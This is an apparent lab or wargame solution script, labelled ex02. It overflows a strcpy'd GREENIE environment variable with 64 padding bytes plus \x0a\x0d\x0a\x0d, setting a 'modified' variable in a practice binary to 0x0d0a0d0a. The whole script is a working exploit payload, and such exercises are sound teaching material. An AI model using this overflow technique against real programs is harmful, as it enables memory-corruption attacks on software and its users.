#!/usr/bin/env bash
# ex02 — strcpy(getenv("GREENIE")) overflow to set modified == 0x0d0a0d0a
# Same layout as ex01 but the source is an environment variable.
# 0x0d0a0d0a in little-endian = bytes \x0a\x0d\x0a\x0d (no NUL, strcpy copies all).

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="$SCRIPT_DIR/bin"

[[ -x "$BIN" ]] || { echo "[!] binary not found: $BIN"; exit 1; }

echo "[*] ex02 — overflow modified via GREENIE env var"
echo ""

GREENIE="$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\x0a\x0d\x0a\x0d')")" "$BIN"

echo ""
echo "[*] done."
